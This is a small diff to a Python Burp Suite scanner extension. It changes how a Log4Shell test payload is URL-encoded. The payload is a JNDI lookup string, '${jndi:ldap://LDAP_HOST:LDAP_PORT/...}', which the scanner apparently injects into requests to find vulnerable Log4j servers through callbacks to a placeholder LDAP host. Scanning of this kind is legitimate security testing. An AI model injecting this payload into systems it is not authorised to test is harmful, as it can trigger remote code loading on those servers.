@@ -8,7 +8,7 @@ from burp import IScannerInsertionPoint
 from burp import IParameter
 from array import array
 from hashlib import md5
-import urllib2, json, random, re
+import urllib, urllib2, json, random, re
 
 class BurpExtender(IBurpExtender, IScannerCheck):
 
@@ -34,7 +34,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         return new_md5.hexdigest()[20:]
 
     def _build_payload(self, random_md5):
-        return self._helpers.urlEncode("${jndi:ldap://LDAP_HOST:LDAP_PORT/" + random_md5 + "}")
+        return urllib.quote("${jndi:ldap://LDAP_HOST:LDAP_PORT/" + random_md5 + "}")
 
     def _build_request_list(self, baseRequestResponse):
         request_list = {}
